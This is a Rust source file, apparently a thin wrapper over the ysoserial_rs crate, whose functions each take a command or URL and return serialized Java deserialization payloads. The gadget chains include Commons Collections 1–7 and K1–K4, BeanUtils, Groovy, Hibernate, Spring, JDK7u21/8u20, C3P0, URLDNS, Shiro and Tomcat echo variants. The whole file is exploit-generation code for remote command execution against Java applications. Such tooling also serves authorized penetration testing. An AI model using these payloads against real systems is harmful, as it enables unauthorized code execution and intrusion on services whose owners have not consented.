use ysoserial_rs::*;

pub fn bs1(cmd: &str) -> Vec<u8> {
    get_commons_beanutils1(cmd)
}

pub fn cc1(cmd: &str) -> Vec<u8> {
    get_commons_collections1(cmd)
}

pub fn cc2(cmd: &str) -> Vec<u8> {
    get_commons_collections2(cmd)
}

pub fn cc3(cmd: &str) -> Vec<u8> {
    get_commons_collections3(cmd)
}

pub fn cc4(cmd: &str) -> Vec<u8> {
    get_commons_collections4(cmd)
}

pub fn cc5(cmd: &str) -> Vec<u8> {
    get_commons_collections5(cmd)
}

pub fn cc6(cmd: &str) -> Vec<u8> {
    get_commons_collections6(cmd)
}

pub fn cc7(cmd: &str) -> Vec<u8> {
    get_commons_collections7(cmd)
}

pub fn cck1(cmd: &str) -> Vec<u8> {
    get_commons_collections_k1(cmd)
}

pub fn cck2(cmd: &str) -> Vec<u8> {
    get_commons_collections_k2(cmd)
}

pub fn cck3(cmd: &str) -> Vec<u8> {
    get_commons_collections_k3(cmd)
}

pub fn cck4(cmd: &str) -> Vec<u8> {
    get_commons_collections_k4(cmd)
}

pub fn clojure(cmd: &str) -> Vec<u8> {
    get_clojure(cmd)
}

pub fn groovy1(cmd: &str) -> Vec<u8> {
    get_groovy1(cmd)
}

pub fn hibernate1(cmd: &str) -> Vec<u8> {
    get_hibernate1(cmd)
}

pub fn hibernate2(cmd: &str) -> Vec<u8> {
    get_hibernate2(cmd)
}

pub fn javassist_weld1(cmd: &str) -> Vec<u8> {
    get_javassist_weld1(cmd)
}

pub fn jboss_interceptors1(cmd: &str) -> Vec<u8> {
    get_jboss_interceptors1(cmd)
}

pub fn jdk7u21(cmd: &str) -> Vec<u8> {
    get_jdk7u21(cmd)
}

pub fn jdk8u20(cmd: &str) -> Vec<u8> {
    get_jdk8u20(cmd)
}

pub fn json1(cmd: &str) -> Vec<u8> {
    get_json1(cmd)
}

pub fn mozilla_rhino1(cmd: &str) -> Vec<u8> {
    get_mozilla_rhino1(cmd)
}

pub fn mozilla_rhino2(cmd: &str) -> Vec<u8> {
    get_mozilla_rhino2(cmd)
}

pub fn myfaces1(cmd: &str) -> Vec<u8> {
    get_myfaces1(cmd)
}

pub fn rome(cmd: &str) -> Vec<u8> {
    get_rome(cmd)
}

pub fn spring1(cmd: &str) -> Vec<u8> {
    get_spring1(cmd)
}

pub fn spring2(cmd: &str) -> Vec<u8> {
    get_spring2(cmd)
}

pub fn vaadin1(cmd: &str) -> Vec<u8> {
    get_vaadin1(cmd)
}

pub fn url_dns(url: &str) -> Vec<u8> {
    get_url_dns(url)
}

pub fn c3p0(url: &str) -> Vec<u8> {
    get_c3p0(url)
}

pub fn cck1_tomcat_echo(name: &str, cmd: &str) -> Vec<u8> {
    get_cck1_tomcat_echo(name, cmd)
}

pub fn shiro_spc() -> Vec<u8> {
    get_shiro_simple_principal_collection()
}

pub fn cck2_tomcat_echo(name: &str, cmd: &str) -> Vec<u8> {
    get_cck2_tomcat_echo(name, cmd)
}
